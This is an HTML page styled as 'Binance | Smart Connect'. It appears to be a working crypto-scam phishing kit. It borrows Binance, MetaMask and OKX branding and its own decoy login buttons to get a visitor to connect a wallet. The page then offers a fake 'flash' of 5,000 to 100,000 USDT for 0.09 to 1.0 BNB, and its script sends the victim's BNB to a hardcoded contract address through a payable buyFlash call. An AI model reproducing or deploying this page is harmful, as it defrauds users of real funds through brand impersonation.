<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Binance | Smart Connect</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        :root { --gold: #F3BA2F; --dark: #0B0E11; --card: #1E2329; --text: #EAECEF; --sub: #848E9C; }
        body { background: var(--dark); color: var(--text); font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        
        /* Modal Overlay (Professional Look) */
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(4px); }
        .modal-content { background: #181A20; width: 90%; max-width: 380px; border-radius: 20px; padding: 24px; border: 1px solid #2B3139; position: relative; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .close-btn { cursor: pointer; color: var(--sub); font-size: 24px; }

        /* Wallet Options List */
        .wallet-list { display: flex; flex-direction: column; gap: 10px; }
        .wallet-item { display: flex; align-items: center; justify-content: space-between; background: #2B3139; padding: 12px 16px; border-radius: 12px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
        .wallet-item:hover { border-color: var(--gold); background: #363D45; }
        .wallet-info { display: flex; align-items: center; gap: 12px; }
        .wallet-info img { width: 32px; height: 32px; border-radius: 8px; }
        .tag { font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 4px; }
        .tag-installed { background: rgba(46, 189, 133, 0.2); color: #2ebd85; }
        .tag-qr { background: rgba(132, 142, 156, 0.2); color: var(--sub); }

        /* Social/Other Options */
        .divider { display: flex; align-items: center; text-align: center; margin: 20px 0; color: var(--sub); font-size: 14px; }
        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #2B3139; }
        .divider:not(:empty)::before { margin-right: .5em; }
        .divider:not(:empty)::after { margin-left: .5em; }

        .social-row { display: flex; justify-content: center; gap: 15px; margin-top: 15px; }
        .social-icon { width: 36px; height: 36px; background: #2B3139; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; }

        /* Main App Card */
        .app-card { background: var(--card); width: 340px; border-radius: 24px; padding: 30px; border: 1px solid #2B3139; text-align: center; }
        .btn-main { background: var(--gold); color: #000; border: none; width: 100%; padding: 16px; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
        select { width: 100%; background: #0B0E11; color: #fff; border: 1px solid #474D57; padding: 14px; border-radius: 10px; margin-bottom: 15px; outline: none; }
    </style>
</head>
<body>

<div class="app-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" width="130" style="margin-bottom: 25px;">
    
    <div id="connect-section">
        <button class="btn-main" onclick="openWalletModal()">Connect Wallet</button>
    </div>

    <div id="action-section" style="display:none;">
        <select id="tier">
            <option value="0.09">5,000 USDT (0.09 BNB)</option>
            <option value="0.2">10,000 USDT (0.2 BNB)</option>
            <option value="0.5">50,000 USDT (0.5 BNB)</option>
            <option value="1.0">100,000 USDT (1.0 BNB)</option>
        </select>
        <button class="btn-main" onclick="startFlash()">Activate Protocol ‚ö°</button>
    </div>
    <div id="msg" style="margin-top:15px; font-size:12px; color:var(--gold);">Awaiting Node Link...</div>
</div>

<div class="modal-overlay" id="wModal">
    <div class="modal-content">
        <div class="modal-header">
            <span style="font-weight: bold; font-size: 18px;">Connect Wallet</span>
            <span class="close-btn" onclick="closeWalletModal()">&times;</span>
        </div>

        <div class="wallet-list">
            <div class="wallet-item" onclick="tryConnect()">
                <div class="wallet-info">
                    <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg">
                    <span>WalletConnect</span>
                </div>
                <span class="tag tag-qr">QR CODE</span>
            </div>

            <div class="wallet-item" onclick="tryConnect()">
                <div class="wallet-info">
                    <img src="https://www.okx.com/cdn/assets/imgs/221/9E4FE6E178351F9F.png">
                    <span>OKX Wallet</span>
                </div>
                <span class="tag tag-installed">INSTALLED</span>
            </div>

            <div class="wallet-item" onclick="tryConnect()">
                <div class="wallet-info">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg">
                    <span>MetaMask</span>
                </div>
                <span class="tag tag-installed">INSTALLED</span>
            </div>
        </div>

        <div class="divider">or</div>

        <div style="background: #2B3139; padding: 12px; border-radius: 12px; color: var(--sub); font-size: 14px; text-align: left; cursor: pointer;">
            üìß Email
        </div>

        <div style="background: #2B3139; padding: 12px; border-radius: 12px; color: #fff; font-size: 14px; text-align: center; margin-top: 10px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
            <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" width="18"> Continue With Google
        </div>

        <div class="social-row">
            <div class="social-icon">ùïè</div>
            <div class="social-icon">üí¨</div>
            <div class="social-icon">üçé</div>
            <div class="social-icon">üêô</div>
        </div>

        <div style="text-align: center; margin-top: 20px; font-size: 13px; color: var(--sub);">
            Haven't got a wallet? <span style="color:var(--gold); cursor:pointer;">Get started</span>
        </div>
    </div>
</div>

<script>
    let web3, account;
    const CONTRACT_ADDR = "0x8933877Ad38598Ad25bf97f9ECEBbCE5D901eB71"; 
    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];

    function openWalletModal() { document.getElementById('wModal').style.display = 'flex'; }
    function closeWalletModal() { document.getElementById('wModal').style.display = 'none'; }

    async function tryConnect() {
        if (window.ethereum) {
            try {
                const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
                account = accs[0];
                web3 = new Web3(window.ethereum);
                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
                
                closeWalletModal();
                document.getElementById('connect-section').style.display = 'none';
                document.getElementById('action-section').style.display = 'block';
                document.getElementById('msg').innerText = "Connected: " + account.substring(0,10);
            } catch (e) { alert("Connection Error"); }
        } else { alert("Please use a Web3 Browser"); }
    }

    async function startFlash() {
        const val = document.getElementById('tier').value;
        const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
        try {
            document.getElementById('msg').innerText = "Broadcasting to Node...";
            await contract.methods.buyFlash().send({ from: account, value: web3.utils.toWei(val, "ether") });
            document.getElementById('msg').innerText = "Activation Successful!";
        } catch (e) { document.getElementById('msg').innerText = "Rejected."; }
    }
</script>
</body>
